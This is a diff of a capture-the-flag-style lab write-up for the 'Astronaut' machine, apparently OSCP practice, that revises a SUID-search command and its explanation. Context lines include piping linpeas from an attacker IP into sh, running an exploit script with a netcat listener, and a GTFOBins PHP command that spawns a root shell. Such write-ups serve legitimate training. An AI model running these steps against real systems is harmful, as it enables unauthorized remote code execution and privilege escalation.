@@ -1,6 +1,6 @@
 ---
 title: Astronaut
-date: 2023-12-15
+date: 2023-12-22
 tags:
   - OSCP
   - PG Practice
@@ -67,7 +67,7 @@ Start a netcat listener and run the script using `python3 49973.py`
 # Privilege Escalation
 ## Manual commands
 ``` bash
-find / -type f -perm -4001 -exec ls -h {} \; 2> /dev/null
+find / -type f -perm -4001 -exec ls -la {} \; 2> /dev/null
 ```
 
 ### Explanation:
@@ -77,10 +77,11 @@ find: Initiates the find command for searching files and directories.
 `-type f`: Specifies that only files (not directories) should be considered in the search.
 `-perm -4001`: Searches for files with the SUID bit set. The SUID bit, when set, allows a file to be executed with the permissions of its owner.
 
-`-exec ls -h {} \;`:
-`-exec`: Executes a command for each matched file.
-`ls -h {}`: Uses the `ls` command to list information about the found files. The `-h` option is used to make file sizes more human-readable. The `{}` are replaced by the matched file for each iteration.
-`\;`: Marks the end of the -exec command.
+`-exec ls -la {} \;`:
+`-exec`: Executes a command for each matched file. The command is
+  `ls -la {}`: Uses the `ls` command to list information about the found files. The `-la` option is used to make a list showing all files and details.
+  `{}`: is replaced by the matched file for each iteration.
+  `\;`: Marks the end of the -exec command.
 
 `2> /dev/null`:
 `2>`: Redirects standard error (stderr) to a specified location.
@@ -98,15 +99,15 @@ curl http://192.168.45.220/linpeas.sh | sh
 ```
 
 ### Linpeas Results
-The linpeas results showed php7.4 binary file in the directory `/usr/bin/php7.4` that does has an unknown SUID binary. The output is shown below
+The linpeas results showed php7.4 binary file in the directory `/usr/bin/php7.4` that has an unknown SUID binary. The output is shown below
 ```
 -rwsr-xr-x 1 root root 4.6M Feb 23  2023 /usr/bin/php7.4 (Unknown SUID binary!)
 ```
 
 We can confirm these findings with the manual enumeration commands we used. We did indeed find a php7.4 file.
-- Using this information we can try to find privilege escalation for SUID in [GTFOBins](https://gtfobins.github.io/gtfobins/php/)
+- Using this information we can try to find privilege escalation for PHP SUID in [GTFOBins](https://gtfobins.github.io/gtfobins/php/)
 
-GTFOBins uses the following command
+GTFOBins uses the following command, the previous parts can be ignored as we know the version number of php.
 ``` bash
 ./php -r "pcntl_exec('/bin/sh', ['-p']);"
 ```
